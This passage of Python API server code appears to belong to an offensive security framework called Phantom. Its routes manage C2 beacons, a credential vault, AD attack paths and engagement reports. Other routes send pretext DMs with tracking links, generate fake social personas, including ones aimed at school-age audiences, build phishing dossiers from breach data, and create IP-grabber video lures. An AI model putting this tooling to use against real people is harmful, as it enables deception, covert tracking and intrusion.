                # Module action words (deploy-agent, privesc-run, run, …)
                # are PHANTOM commands, not external tools — the first token
                # of a suggested command is only an installable tool when it
                # is not the module's own subcommand (do_* handler) and not
                # a shell builtin like sudo.
                if _is_phantom_action(instance, tool):
                    continue
                if _shutil.which(tool) is None and not _tool_in_wsl(tool):
                    missing.append({"tool": tool, "module": name,
                                    "hint": tool_install_hint(tool)})
        except Exception:
            pass

    return _json({"missing": missing, "ok": len(missing) == 0,
                  "message": "All tools installed" if not missing else f"{len(missing)} tool(s) missing"})


# ── Session Save / Load ─────────────────────────────────────────────────────

@routes.post("/api/session/save")
async def session_save(request: web.Request) -> web.Response:
    """Save full session to disk (including WorldModel)."""
    body = await request.json() or {}
    name = (body.get("name") or "").strip()
    if not name:
        return _error("Missing session name")
    try:
        session.save(name)
        return _json({"status": "saved", "name": name})
    except Exception as e:
        return _error(str(e))


@routes.post("/api/session/load")
async def session_load(request: web.Request) -> web.Response:
    """Load a full session from disk."""
    body = await request.json() or {}
    name = (body.get("name") or "").strip()
    if not name:
        return _error("Missing session name")
    try:
        session.load(name)
        _persist_session()
        return _json({"status": "loaded", "name": name, "target": session.target,
                      "scope": session.scope})
    except FileNotFoundError:
        return _error(f"Session '{name}' not found", 404)
    except Exception as e:
        return _error(str(e))


@routes.get("/api/session/list")
async def session_list(_request: web.Request) -> web.Response:
    """List all saved sessions."""
    try:
        saved = session.list_saved()
    except Exception:
        saved = []
    return _json({"sessions": saved})


# ── Portable .pm bundles ────────────────────────────────────────────────────

def _pm_dir() -> str:
    from phantom.utils.paths import sessions_dir
    return sessions_dir()


@routes.get("/api/pm/list")
async def pm_list(_request: web.Request) -> web.Response:
    """List the .pm engagement bundles on this machine (name, size, mtime,
    target) — the Electron Sessions tab renders these."""
    from phantom.utils.paths import sessions_dir
    out = []
    try:
        d = sessions_dir()
        for name in sorted(os.listdir(d)):
            if not name.endswith(".pm"):
                continue
            p = os.path.join(d, name)
            if not os.path.isfile(p):
                continue
            st = os.stat(p)
            target = ""
            try:
                from phantom.utils.session_bundle import read_bundle
                data = read_bundle(p)
                target = (data.get("session") or {}).get("target") or ""
            except Exception:
                pass  # unreadable/corrupt bundle still listed, target empty
            out.append({
                "name": name, "size": st.st_size,
                "mtime": datetime.fromtimestamp(st.st_mtime)
                    .strftime("%Y-%m-%d %H:%M:%S"),
                "target": target,
            })
    except OSError:
        pass
    return _json({"bundles": out})


@routes.post("/api/pm/export")
async def pm_export(request: web.Request) -> web.Response:
    """Export the CURRENT engagement into a portable encrypted .pm bundle
    (session + auto-mode checkpoint + report index + C2 intel)."""
    body = await request.json() or {}
    name = (body.get("name") or "").strip()
    try:
        from phantom.utils.session_bundle import export_session
        out_path = os.path.join(_pm_dir(),
                                f"{name}.pm") if name else None
        path = export_session(out_path=out_path)
        return _json({"status": "exported", "path": path,
                      "name": os.path.basename(path)})
    except Exception as e:
        return _error(f"pm export failed: {e}")


@routes.post("/api/pm/import")
async def pm_import(request: web.Request) -> web.Response:
    """Import a .pm bundle by name (from data/sessions/) or absolute path.
    Restores session + knowledge + auto-mode checkpoint."""
    body = await request.json() or {}
    name = (body.get("name") or "").strip()
    if not name:
        return _error("Missing bundle name")
    path = name if os.path.isabs(name) and os.path.isfile(name) else \
        os.path.join(_pm_dir(), os.path.basename(name))
    if not os.path.isfile(path):
        return _error(f"Bundle '{os.path.basename(name)}' not found", 404)
    try:
        from phantom.utils.session_bundle import import_session, summarize
        data = import_session(path)
        _persist_session()
        return _json({"status": "imported", "summary": summarize(data),
                      "target": data.get("target") or ""})
    except FileNotFoundError:
        return _error("Bundle file disappeared", 404)
    except ValueError as e:
        return _error(str(e))
    except Exception as e:
        return _error(f"pm import failed: {e}")


# ── Reports Export-All ──────────────────────────────────────────────────────

@routes.post("/api/reports/export-all")
async def reports_export_all(request: web.Request) -> web.Response:
    """Generate AND export both raw + client reports in one step."""
    body = await request.json() or {}
    fmt = body.get("format", "html")
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    target = session.target or "unknown"
    mode = _api_target_type()
    scope = ", ".join(session.scope) if session.scope else "—"

    # Build both reports
    raw = _build_raw_report(target, mode, scope, now)
    client = _build_client_report(target, mode, scope, now)

    # the target may contain path-hostile characters (<script>, :/\ ...):
    # sanitize it before it becomes part of a filesystem path
    target_safe = re.sub(r"[^A-Za-z0-9._-]", "_", target)
    report_dir = os.path.join(
        sessions_dir(), f"report_{target_safe}_{int(time.time())}")
    os.makedirs(report_dir, exist_ok=True)

    if fmt == "json":
        raw_path = os.path.join(report_dir, "raw_audit.json")
        client_path = os.path.join(report_dir, "client_report.json")
        with open(raw_path, "w") as f:
            json.dump({"report": raw, "generated_at": now}, f, indent=2)
        with open(client_path, "w") as f:
            json.dump({"report": client, "generated_at": now}, f, indent=2)
    else:
        ext = "html" if fmt == "html" else "pdf"
        raw_path = os.path.join(report_dir, f"raw_audit.{ext}")
        client_path = os.path.join(report_dir, f"client_report.{ext}")
        with open(raw_path, "w") as f:
            if fmt == "html":
                f.write(f"<html><head><title>Phantom Raw Audit</title></head><body><pre>{raw}</pre></body></html>")
            else:
                f.write(raw)
        with open(client_path, "w") as f:
            if fmt == "html":
                f.write(f"<html><head><title>Phantom Client Report</title></head><body><pre>{client}</pre></body></html>")
            else:
                f.write(client)

    return _json({
        "status": "exported",
        "format": fmt,
        "raw_path": raw_path,
        "client_path": client_path,
        "generated_at": now,
    })


def _build_raw_report(target: str, mode: str, scope: str, now: str) -> str:
    """Build the raw audit report."""
    lines = ["PHANTOM — RAW AUDIT REPORT", "=" * 60, "",
             f"Generated:  {now}", f"Target:     {target}",
             f"Type:       {mode.upper()}", f"Scope:      {scope}", "",
             "─" * 40, "ENGAGEMENT SUMMARY", "─" * 40, ""]
    for key, val in (session.results or {}).items():
        lines.append(f"[{key.upper()}] {val}"[:200])
    if not session.results:
        lines.append("(no module results yet)")
    lines += ["", "Notes:"]
    if session.notes:
        lines += [f"  • {n}" for n in session.notes]
    else:
        lines.append("  (none)")
    lines += ["", "Command History:"]
    if session.history:
        lines += [f"  {i+1}. {c}" for i, c in enumerate(session.history[-50:])]
    lines += ["", "END OF RAW REPORT"]
    return "\n".join(lines)


def _build_client_report(target: str, mode: str, scope: str, now: str) -> str:
    """Build the sanitized client report."""
    findings = _client_findings(session.results)
    return f"""PHANTOM — SECURITY ASSESSMENT REPORT (CLIENT)
{'=' * 60}

Assessment Date:  {now}
Target Scope:     {scope}

{'─' * 40}
EXECUTIVE SUMMARY
{'─' * 40}

Phantom performed a {mode.upper()} security assessment of the
target system(s) following industry-standard methodology.

{'─' * 40}
FINDINGS
{'─' * 40}

{findings}

END OF CLIENT REPORT
"""


# ── State Config ────────────────────────────────────────────────────────────

@routes.get("/api/config")
async def config_get(_request: web.Request) -> web.Response:
    """Return the auto-generated state store configuration."""
    return _json(state_status())


# ── Global Search ────────────────────────────────────────────────────────────

@routes.post("/api/search")
async def search_global(request: web.Request) -> web.Response:
    """Global search across all modules, session, C2, and auto-mode data."""
    body = await request.json() or {}
    query = (body.get("query") or "").strip().lower()
    if not query or len(query) < 2:
        return _json({"results": [], "query": query, "hint": "Type 2+ characters to search"})

    results: list[dict] = []

    # Search session data
    if session.target and query in (session.target or "").lower():
        results.append({"source": "session", "type": "target", "label": f"Target: {session.target}", "action": "session"})
    for note in (session.notes or []):
        if query in note.lower():
            results.append({"source": "session", "type": "note", "label": note[:80], "action": "session"})
    for key, val in (session.results or {}).items():
        if query in str(key).lower() or query in str(val).lower()[:200]:
            results.append({"source": "session", "type": "result", "label": f"{key}: {str(val)[:80]}", "action": "session"})

    # Search C2 beacons
    for b in _c2_beacons_list():
        if query in b["id"].lower() or query in b.get("hostname", "").lower() or query in b.get("user", "").lower():
            results.append({"source": "c2", "type": "beacon", "label": f"Beacon {b['id'][:12]} @ {b.get('hostname', '?')}", "action": "c2"})

    # Search all module commands
    for mod_name in _MODULES:
        instance = _module_instance(mod_name)
        if not instance:
            continue
        for method in ("suggest_commands", "build_commands"):
            groups = _module_groups(instance, method)
            for group_name, cmds in groups.items():
                for cmd in cmds:
                    if query in cmd.lower():
                        results.append({
                            "source": "module", "type": "command", "module": mod_name,
                            "label": cmd[:120], "group": group_name,
                            "action": mod_name, "command": cmd
                        })
                        break
                if len(results) >= 30:
                    break
            if len(results) >= 30:
                break
        if len(results) >= 30:
            break

    return _json({"results": results[:30], "query": query, "total": len(results)})


# ── Campaign Timeline ──────────────────────────────────────────────────────

_timeline_events: list[dict] = []
_timeline_lock = threading.Lock()


def _push_timeline(source: str, event_type: str, detail: str) -> None:
    """Record a timeline event (called by modules / auto-mode / C2)."""
    with _timeline_lock:
        _timeline_events.append({
            "time": datetime.now().strftime("%H:%M:%S"),
            "source": source,
            "type": event_type,
            "detail": detail[:200],
        })
        if len(_timeline_events) > 500:
            _timeline_events[:] = _timeline_events[-500:]


@routes.get("/api/timeline")
async def timeline_get(_request: web.Request) -> web.Response:
    """Return the campaign timeline (last 500 events)."""
    # Auto-ingest from session history and C2 state
    with _timeline_lock:
        # Seed from session data if empty
        if not _timeline_events:
            for i, cmd in enumerate((session.history or [])[-50:]):
                _timeline_events.append({
                    "time": "—", "source": "shell", "type": "command",
                    "detail": cmd[:120]
                })
            for bid in c2_state.get_beacons():
                _timeline_events.append({
                    "time": "—", "source": "c2", "type": "beacon",
                    "detail": f"Beacon registered: {bid[:16]}"
                })
        events = list(_timeline_events[-200:])
    return _json({"events": events, "count": len(events)})


@routes.post("/api/timeline")
async def timeline_push(request: web.Request) -> web.Response:
    """Push a manual timeline event."""
    body = await request.json() or {}
    _push_timeline(
        body.get("source", "manual"),
        body.get("type", "note"),
        body.get("detail", "")
    )
    return _json({"status": "recorded"})


# ── Credential Vault ───────────────────────────────────────────────────────

_vault_entries: list[dict] = []
_vault_lock = threading.Lock()


@routes.get("/api/vault")
async def vault_get(request: web.Request) -> web.Response:
    """Return credential vault entries."""
    query = (request.query.get("q") or "").lower()
    with _vault_lock:
        if query:
            entries = [e for e in _vault_entries if query in str(e).lower()]
        else:
            entries = list(_vault_entries)
    return _json({"entries": entries[-100:], "total": len(_vault_entries)})


@routes.post("/api/vault")
async def vault_add(request: web.Request) -> web.Response:
    """Add a credential to the vault."""
    body = await request.json() or {}
    entry = {
        "id": f"vault_{int(time.time())}_{secrets.token_hex(3)}",
        "time": datetime.now().strftime("%H:%M:%S"),
        "target": body.get("target", session.target or "—"),
        "type": body.get("type", "credential"),
        "username": body.get("username", ""),
        "password": body.get("password", ""),
        "hash": body.get("hash", ""),
        "service": body.get("service", ""),
        "source": body.get("source", "manual"),
        "notes": body.get("notes", ""),
    }
    with _vault_lock:
        _vault_entries.append(entry)
        if len(_vault_entries) > 1000:
            _vault_entries[:] = _vault_entries[-1000:]
    return _json({"status": "added", "entry": entry})


# ── Network Map ──────────────────────────────────────────────────────────

@routes.get("/api/network-map")
async def network_map_get(_request: web.Request) -> web.Response:
    """Build a visual network map from the SHARED WorldModel — the same typed
    findings the auto-mode reasons over (services, hosts, beacons, creds)."""
    nodes: list[dict] = []
    edges: list[dict] = []
    seen_nodes: set[str] = set()

    def add_node(nid: str, label: str, ntype: str, color: str, detail: str = "",
                 meta: dict | None = None) -> None:
        if nid in seen_nodes:
            return
        seen_nodes.add(nid)
        node = {"id": nid, "label": label[:24], "type": ntype,
                "color": color, "detail": detail[:120]}
        if meta:
            node["meta"] = meta
        nodes.append(node)

    def add_edge(a: str, b: str, label: str) -> None:
        edges.append({"from": a, "to": b, "label": label})

    add_node("attacker", "Attacker", "attacker", "#FF3333")

    wm_findings: list = []
    try:
        from phantom.core.knowledge import session_wm
        wm = session_wm()
        wm_findings = [f for f in wm.all_findings() if f.confidence >= 0.5]
        # after an app restart the in-memory WM is empty — bring back the
        # persisted network devices so the map is populated immediately
        if not any(f.kind == "host" for f in wm_findings):
            try:
                from phantom.core.netmap import reseed_known_hosts
                reseed_known_hosts()
                wm_findings = [f for f in wm.all_findings()
                               if f.confidence >= 0.5]
            except Exception:
                pass
    except Exception:
        wm_findings = []

    services = [f for f in wm_findings if f.kind == "service"]
    hosts = [f for f in wm_findings if f.kind == "host"]
    creds = [f for f in wm_findings if f.kind == "creds"]
    vulns = [f for f in wm_findings if f.kind in ("vuln", "hunt_anomaly", "exploit_plan")]

    target = session.target or ""
    # NO placeholder node for the session target: a bare bubble whose label
    # was the raw target IP used to appear next to the real device and kept
    # "changing" whenever the operator retargeted. The session target is
    # instead flagged on whichever REAL discovered device matches (is_target
    # meta) — the UI draws the aura there. Only when the target is NOT among
    # the discovered hosts do we materialize one node for it, so an external
    # target is still visible exactly once.
    target_ip = None
    if target:
        try:
            import socket as _socket
            target_ip = _socket.gethostbyname(target) if any(
                c.isalpha() for c in target) else target
        except Exception:
            target_ip = target

    for h in hosts[:12]:
        v = h.value if isinstance(h.value, dict) else {}
        hid = f"host_{h.key}"
        hostname = str(v.get("hostname") or "")
        vendor = str(v.get("vendor") or "")
        mac = str(v.get("mac") or "")
        node_ip = str(v.get("ip", h.key))
        # label shows the device NAME (hostname/vendor) so the map never
        # renders a pile of anonymous IPs; the IP stays in the detail panel
        os_guess = str(v.get("os", "") or "")
        services = str(v.get("services", "") or "")
        ports = v.get("ports") if isinstance(v.get("ports"), list) else []
        is_tgt = bool(target) and (node_ip == target or h.key == target
                                   or node_ip == target_ip)
        add_node(hid, hostname or node_ip, "host", "#58A6FF",
                 ", ".join(p for p in (vendor, os_guess, services) if p)
                 or (", ".join(p for p in (vendor, mac) if p) or h.source),
                 meta={"ip": node_ip, "mac": mac,
                       "vendor": vendor, "hostname": hostname,
                       "os": os_guess, "services": services,
                       "ports": ports,
                       "alive": bool(v.get("alive", True)),
                       "last_seen": v.get("last_seen", ""),
                       "source": h.source,
                       "is_target": is_tgt})

    # anchor for finding edges: the real target device when it exists, else
    # a single session node for an undiscovered/external target, else attacker
    host_id = None
    if target:
        match = next((n for n in nodes if n["type"] == "host"
                      and n.get("meta", {}).get("is_target")), None)
        if match:
            host_id = match["id"]
        else:
            host_id = f"host_{target}"
            add_node(host_id, target, "host", "#58A6FF", "session target (not yet scanned)",
                     meta={"ip": target, "hostname": target, "source": "session",
                           "is_target": True})

    for svc in services[:24]:
        v = svc.value if isinstance(svc.value, dict) else {}
        port = v.get("port", "")
        banner = str(v.get("banner", v.get("service", "")))
        sid = f"svc_{svc.key}"
        add_node(sid, f"{port or svc.key}", "service", "#3FB950", banner)
        add_edge(host_id or "attacker", sid, "open")

    for i, vul in enumerate(vulns[:12]):
        v = vul.value if isinstance(vul.value, dict) else {}
        vid = f"vuln_{vul.key}_{i}"
        add_node(vid, str(v.get("class", vul.key)), "vuln", "#D29922",
                 str(v.get("detail", vul.source)))
        add_edge(host_id or "attacker", vid, "finding")

    for i, c in enumerate(creds[:12]):
        v = c.value if isinstance(c.value, dict) else {}
        cid = f"creds_{c.key}_{i}"
        add_node(cid, str(v.get("user", c.key)), "creds", "#F85149",
                 str(v.get("service", "")))
        add_edge(host_id or "attacker", cid, "credentials")

    for b in _c2_beacons_list():
        bid = b["id"]
        add_node(bid, b.get("hostname", bid[:8]), "beacon", "#BD34FE",
                 f"{b.get('user', '?')} — {b.get('os', '?')}")
        add_edge(host_id or "attacker", bid, "beacon")

    n_beacons = len(c2_state.get_beacons())
    # network shape — lets the UI lay the map out like a real topology
    topology: dict = {}
    try:
        from phantom.core.netmap import detect_topology, load_discovered_hosts
        topology = detect_topology(load_discovered_hosts())
    except Exception:
        topology = {}
    return _json({
        "nodes": nodes,
        "edges": edges,
        "target": target,
        "services": len(services),
        "beacons": n_beacons,
        "topology": topology,
    })


@routes.get("/api/c2/audit")
async def c2_audit_get(request: web.Request) -> web.Response:
    """Hash-chained audit log for the Electron Audit Viewer: recent records
    (?tail=N, default 50) + tamper-evidence verdict (verify())."""
    try:
        n = int(request.query.get("tail", "50"))
    except ValueError:
        n = 50
    n = max(1, min(n, 500))
    from phantom.utils.audit_log import audit_log
    ok, count, bad = audit_log.verify()
    records = audit_log.tail(n)
    return _json({
        "verified": ok,
        "records": count,
        "first_bad": bad,
        "entries": records,
    })


@routes.get("/api/attack-graph")
async def attack_graph_get(_request: web.Request) -> web.Response:
    """Cross-service attack paths from the shared WorldModel (attack_chain.py):
    directed chains like SSRF→IMDS→IAM creds→data, SMB anon→creds→beacon.
    Powers the Electron 'Attack Paths' visual — same model the agent plans on."""
    chains: list[dict] = []
    try:
        from phantom.core.knowledge import session_wm
        from phantom.automation.attack_chain import AttackGraph
        wm = session_wm()
        graph = AttackGraph(wm)
        graph.build()
        for p in graph.find_paths("beacon", max_paths=10):
            chains.append({
                "steps": list(p.nodes),
                "score": round(p.total_confidence, 3),
                "technique": (p.edges[-1].technique if p.edges else ""),
                "summary": p.summary,
            })
        missing = graph.missing_for_goal("beacon")
    except Exception as exc:
        return _json({"chains": [], "error": str(exc)[:200]})
    chains.sort(key=lambda c: c.get("score", 0.0), reverse=True)
    return _json({"chains": chains, "missing_for_beacon": missing})


# ── AD attack graph (BloodHound-style, manual core) ───────────────────────

@routes.get("/api/ad/graph")
async def ad_graph_get(_request: web.Request) -> web.Response:
    """BloodHound-style AD graph: nodes/edges collected by the manual core
    (`use ad`, ad add-user, auto-mode) + shortest attack paths to DA.
    Powers the Electron AD panel — same JSON the CLI `ad` tree renders."""
    try:
        from phantom.core.knowledge import session_wm
        from phantom.core.ad_graph import ingest_from_wm
        g = ingest_from_wm(session_wm())
        return _json(g.to_json())
    except Exception as exc:
        return _json({"domain": "", "nodes": [], "edges": [],
                      "paths": [], "error": str(exc)[:200]})


@routes.post("/api/ad/mutate")
async def ad_graph_mutate(request: web.Request) -> web.Response:
    """Add AD facts from the UI: add-user (with flags), add-edge, add-dc.
    Body: {op: 'add-user'|'add-edge'|'add-dc', ...}"""
    try:
        body = await request.json()
    except Exception:
        return _json({"ok": False, "error": "invalid JSON"}, status=400)
    try:
        from phantom.core.ad_graph import ADGraph, EDGE_TYPES, ingest_from_wm
        from phantom.core.knowledge import session_wm
        g = ingest_from_wm(session_wm())
        op = str(body.get("op", ""))
        if op == "add-user":
            u = str(body.get("user", "")).strip()
            if not u:
                return _json({"ok": False, "error": "user required"}, 400)
            g.add_node(u, "user", label=u)
            if body.get("kerberoastable"):
                g.nodes[u].props["kerberoastable"] = True
            if body.get("as_rep"):
                g.nodes[u].props["as_rep_roastable"] = True
            if body.get("cracked"):
                g.nodes[u].props["cracked"] = True
            for host in (body.get("admin_to") or []):
                if host not in g.nodes:
                    g.add_node(str(host), "computer")
                g.add_edge(u, str(host), "admin_to")
            for host in (body.get("session_on") or []):
                if host not in g.nodes:
                    g.add_node(str(host), "computer")
                g.add_edge(u, str(host), "session")
            for grp in (body.get("groups") or []):
                if grp not in g.nodes:
                    g.add_node(str(grp), "group")
                g.add_edge(u, str(grp), "member_of")
            g._save()
            return _json({"ok": True})
        if op == "add-edge":
            s, t, d = (str(body.get(k, "")) for k in
                       ("src", "type", "dst"))
            if not s or not d or t not in EDGE_TYPES:
                return _json({"ok": False,
                              "error": f"type must be one of {EDGE_TYPES}"},
                             400)
            if s not in g.nodes:
                g.add_node(s, "user")
            if d not in g.nodes:
                g.add_node(d, "computer")
            g.add_edge(s, d, t, str(body.get("note", "")))
            return _json({"ok": True})
        if op == "add-dc":
            h = str(body.get("host", "")).strip()
            if not h:
                return _json({"ok": False, "error": "host required"}, 400)
            g.add_node(h, "dc", label="Domain Controller")
            if g.domain:
                g.add_edge(g.domain, h, "owns")
            g._save()
            return _json({"ok": True})
        return _json({"ok": False, "error": f"unknown op {op!r}"}, 400)
    except Exception as exc:
        return _json({"ok": False, "error": str(exc)[:200]}, 500)


# ── Social DM ────────────────────────────────────────────────────────────────

@routes.post("/api/dm")
async def dm_send(request: web.Request) -> web.Response:
    """Send short pretext DMs (Telegram/Discord) with tracking links.

    Body: {"targets": [...], "pretext": "security_verify", "dry_run": true}
    dry_run defaults to True from the GUI — it prints the DMs to the
    terminal instead of sending, so the operator can preview before
    enabling a real transport.
    """
    body = await request.json() or {}
    targets = body.get("targets") or []
    pretext = body.get("pretext") or "security_verify"
    dry_run = bool(body.get("dry_run", True))
    if not targets:
        return _error("targets required")
    try:
        from phantom.automation.social.engine import SocialEngine
        from phantom.automation.social.grabbit import GrabLink
        from phantom.automation.social.social_dm import dm_delivery_report
        eng = SocialEngine()
        if dry_run:
            class _DryGrabber:
                def create_link(self, label="phish", prefix=""):
                    code = f"{label}-x"
                    return GrabLink(
                        short_url=f"http://dryrun.local/{prefix}{code}",
                        code=code)

                def create_login_link(self, label="login"):
                    return self.create_link(label=label, prefix="l/")
            eng._grabber = _DryGrabber()
        ok, lines = eng.dm(targets, pretext=pretext,
                           platform="console" if dry_run else "auto")
        report = dm_delivery_report(lines)
        return _json({"ok": ok, "markers": lines, "report": report,
                      "dry_run": dry_run})
    except Exception as e:
        traceback.print_exc()
        return _error(f"dm failed: {e}")


# ── Persona profile ───────────────────────────────────────────────────────

@routes.post("/api/persona-profile")
async def persona_profile(request: web.Request) -> web.Response:
    """Generate a coherent social cover (name/age/job/city/interests/bio +
    avatar) with zero configuration.
    Body: {seed?, name?, locale?, audience?}
    audience: middle | high | university | professional (default).
    """
    body = await request.json() or {}
    try:
        from phantom.automation.social.persona import (
            generate_avatar,
            generate_profile,
        )
        seed = body.get("seed")
        profile = generate_profile(seed=seed, locale=body.get("locale", "en"),
                                   name=body.get("name") or None,
                                   audience=body.get("audience", "professional"))
        profile.avatar_path = generate_avatar(profile)
        data = profile.to_dict()
        data["bio"] = profile.bio
        return _json({"ok": True, "profile": data})
    except Exception as e:
        return _error(f"persona profile failed: {e}")


# ── Profile reverse-engineering ────────────────────────────────────────────

@routes.post("/api/profile-recon")
async def profile_recon(request: web.Request) -> web.Response:
    """OSINT mapping of a target social profile: private/public state, bio,
    link in bio, @handles, same-handle accounts on other platforms.
    Body: {username, platform?}
    """
    body = await request.json() or {}
    username = (body.get("username") or "").strip()
    if not username:
        return _error("username required")
    try:
        from phantom.automation.social.engine import SocialEngine
        eng = SocialEngine()
        ok, lines = eng.profile_recon(username, platform=body.get("platform", ""))
        profile = eng._discovered.get("profile") or {}
        return _json({"ok": ok, "markers": lines, "profile": profile})
    except Exception as e:
        traceback.print_exc()
        return _error(f"profile recon failed: {e}")


# ── Target dossier (strategic phishing) ────────────────────────────────────

@routes.post("/api/dossier")
async def dossier_analyze(request: web.Request) -> web.Response:
    """Build the strategic dossier: breach correlation across email/phone,
    recognition hook and recommended pretext.
    Body: {email?, phones?, platform?, company?, breaches?, breach_channels?}
    """
    body = await request.json() or {}
    try:
        from phantom.automation.social.dossier import build_dossier, dossier_summary
        discovered = {
            "name": body.get("name", ""),
            "emails": [body["email"]] if body.get("email") else [],
            "phones": list(body.get("phones") or []),
            "platform": body.get("platform", ""),
            "company": body.get("company", ""),
            "breaches": list(body.get("breaches") or []),
            "breach_channels": body.get("breach_channels") or {},
        }
        d = build_dossier(discovered)
        return _json({"ok": True, "dossier": dossier_summary(d)})
    except Exception as e:
        return _error(f"dossier analysis failed: {e}")


# ── Real-video lure (IP grabber) ───────────────────────────────────────────

@routes.post("/api/video-lure")
async def video_lure(request: web.Request) -> web.Response:
    """Pick a REAL video the target would click on and build the
    share-format IP-grabber link around it.

    Body: {interests?, platform?, query?, handle?, dry_run?}
    interests: free text (profile bio) the topic keywords are matched on;
    query: explicit search topic (e.g. LLM-suggested); platform:
    instagram|tiktok|youtube (default youtube); handle: for the
    /@handle/video/ share shape. dry_run defaults to True: returns the
    video + a dryrun link without touching the tracker.
    """
    body = await request.json() or {}
    dry_run = bool(body.get("dry_run", True))
    try:
        from phantom.automation.social.video_picker import pick_video
        video = pick_video(interests=body.get("interests", ""),
                           platform=body.get("platform", ""),
                           query=body.get("query", ""))
        if not video.get("id"):
            return _error("no video could be picked")
        platform = (body.get("platform") or "youtube").lower()
        if platform not in ("instagram", "tiktok", "youtube"):
            platform = "youtube"
        handle = (body.get("handle") or "creator").strip().lstrip("@")
        if platform == "instagram":
            prefix = "reel/"
        elif platform == "youtube":
            prefix = "shorts/"
        else:
            prefix = f"@{handle}/video/"
        code = f"lure-{uuid.uuid4().hex[:8]}"
        link = f"http://dryrun.local/{prefix}{code}"
        if not dry_run:
            from phantom.automation.social.grabbit import IpGrabber
            grabber = IpGrabber()
            gl = grabber.create_video_share_link(label="lure",
                                                 platform=platform,
                                                 handle=handle, video=video)
            link = gl.short_url
        return _json({"ok": True, "video": video, "link": link,
                      "platform": platform, "dry_run": dry_run})
    except Exception as e:
        return _error(f"video lure failed: {e}")


# ── Export Campaign ZIP ────────────────────────────────────────────────────

@routes.post("/api/export-campaign")
async def export_campaign(_request: web.Request) -> web.Response:
    """Export the entire campaign as a ZIP file."""
    import zipfile
    import io
    now = datetime.now().strftime("%Y%m%d_%H%M%S")
    target = session.target or "unknown"
    buf = io.BytesIO()

    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # Session data
        session_data = {
            "target": session.target, "scope": session.scope,
            "lhost": session.lhost, "lport": session.lport,
            "active_wordlist": session.active_wordlist,
            "notes": session.notes, "results": session.results,
            "history": session.history, "exported_at": now,
        }
        zf.writestr("session.json", json.dumps(session_data, indent=2, default=str))

        # C2 state
        c2_data = {
            "beacons": _c2_beacons_list(),
            "tasks": _c2_tasks_dump(),
        }
        zf.writestr("c2_state.json", json.dumps(c2_data, indent=2, default=str))

        # Vault
        with _vault_lock:
            zf.writestr("vault.json", json.dumps(_vault_entries, indent=2, default=str))

        # Timeline
        with _timeline_lock:
            zf.writestr("timeline.json", json.dumps(_timeline_events, indent=2, default=str))

        # Knowledge
        try:
            from phantom.core.knowledge import knowledge_summary
            zf.writestr("knowledge.json", json.dumps(knowledge_summary(), indent=2, default=str))
        except Exception:
            pass

        # Generate raw + client reports
        raw = _build_raw_report(target, _api_target_type(), ", ".join(session.scope or []), now)
        client = _build_client_report(target, _api_target_type(), ", ".join(session.scope or []), now)
        zf.writestr("raw_audit.txt", raw)
        zf.writestr("client_report.txt", client)

    export_path = os.path.join(sessions_dir(), f"campaign_{target}_{now}.zip")
    with open(export_path, "wb") as f:
        f.write(buf.getvalue())

    return _json({
        "status": "exported",
        "path": export_path,
        "size": os.path.getsize(export_path),
        "target": target,
    })


# ── CORS middleware ────────────────────────────────────────────────────────

@web.middleware
async def cors_middleware(request: web.Request, handler) -> web.Response:
    """Allow the Electron renderer (localhost:5173) to call the API."""
    response = await handler(request)
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    return response


# ── Auth middleware ────────────────────────────────────────────────────────
# Every route requires `Authorization: Bearer <PHANTOM_API_TOKEN>` so that
# other local processes (or a malicious website open in the operator's
# browser) cannot read targets/credentials or revoke beacon identities
# through the localhost API. The Electron main process injects the header;
# the renderer never sees the token. OPTIONS preflight is exempt so the
# browser CORS handshake still works.

@web.middleware
async def auth_middleware(request: web.Request, handler) -> web.Response:
    if request.method == "OPTIONS":
        return await handler(request)
    from phantom.utils.c2_crypto import get_api_token
    expected = get_api_token()
    provided = request.headers.get("Authorization", "")
    if provided != f"Bearer {expected}":
        return web.json_response({"error": "unauthorized"}, status=401)
    return await handler(request)


# ── Server lifecycle ───────────────────────────────────────────────────────

def create_app() -> web.Application:
    app = web.Application(middlewares=[auth_middleware, cors_middleware])
    app.add_routes(routes)
    app.on_startup.append(_restore_session_on_start)
    app.on_cleanup.append(_persist_session_on_stop)
    # Also handle OPTIONS preflight
    return app


async def _restore_session_on_start(_app: web.Application) -> None:
    _restore_session()


async def _persist_session_on_stop(_app: web.Application) -> None:
    _persist_session()


def main(port: int = 9876):
    """Start the API server (called by the Electron main process)."""
    app = create_app()
    print(f"[api] Phantom API server starting on http://127.0.0.1:{port}", flush=True)

    # Ensure state is bootstrapped so Electron never sees a missing config
    try:
        from phantom.utils.state import ensure_bootstrap
        ensure_bootstrap()
    except Exception:
        pass

    web.run_app(app, host="127.0.0.1", port=port, print=lambda *args: None)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Phantom API Server")
    parser.add_argument("--port", type=int, default=9876, help="Port to listen on")
    args = parser.parse_args()
    main(args.port)